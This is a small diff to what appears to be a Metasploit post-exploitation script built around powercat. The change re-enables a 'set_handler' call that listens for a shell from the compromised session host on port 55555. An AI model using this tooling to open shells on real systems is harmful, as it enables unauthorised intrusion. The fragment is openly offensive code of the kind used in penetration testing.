@@ -8,6 +8,7 @@
 # Author: Ben Turner (made into post script and incorporated powercat) 
 # Nicholas Nam (nick[at]executionflow.org)
 # RageLtMan
+# 
 #-------------------------------------------------------------------------------
 ################## Variable Declarations ##################
 
@@ -323,7 +324,7 @@ cmd_out, running_pids, open_channels = execute_script(testscript, 15)
 rhost = @client.session_host
 rport = 55555
 
-#set_handler(rhost,rport)
+set_handler(rhost,rport)
 print_status("If a shell is unsuccesful, ensure you have access to the target host and port. Maybe you need to add a route (route add ?)")
 
 
